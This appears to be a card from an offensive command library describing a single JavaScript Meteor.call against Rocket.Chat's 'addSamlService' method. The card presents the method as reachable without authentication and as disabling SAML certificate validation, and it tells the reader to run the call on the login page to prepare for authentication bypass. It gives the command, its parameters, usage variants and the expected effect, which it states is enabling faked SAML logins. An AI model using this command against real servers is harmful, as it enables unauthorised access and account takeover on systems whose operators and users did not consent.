---
data: 'Meteor.call("addSamlService", "Default_cert")'
tags:
  - meteor
  - saml
type: command
executor: javascript
platforms:
  - Web
id: 15b6d470-9166-4bd3-a9d6-8d2636370383
created_at: '2025-12-13T09:01:26.330Z'
updated_at: '2025-12-13T09:01:26.330Z'
verified: false
validated: true
submitted: true
---
# Meteor Call Add SAML Service

## Command

```javascript
Meteor.call("addSamlService", "Default_cert")
```

## Description

This JavaScript command calls an unauthenticated Meteor method in Rocket.Chat to add a SAML service setting, which disables certificate validation by setting a custom flag to false. Use it on the login page to prepare for authentication bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `method_name` | "addSamlService" - The Meteor method to call | Yes |
| `argument` | "Default_cert" - User-controlled provider name to create the disabling setting | Yes |

## Examples

### Basic Usage

```javascript
Meteor.call("addSamlService", "Default_cert")
```

### Advanced Usage

```javascript
Meteor.call("addSamlService", "CustomProvider")
```

## Expected Output

Sets the SAML_Custom_Default_cert setting to false, bypassing validation. No visible output in console if successful, but prepares the system for faked SAML logins.

## Related

- [[procedures/Disable-SAML-Certificate-Validation-in-Rocket-Chat]]
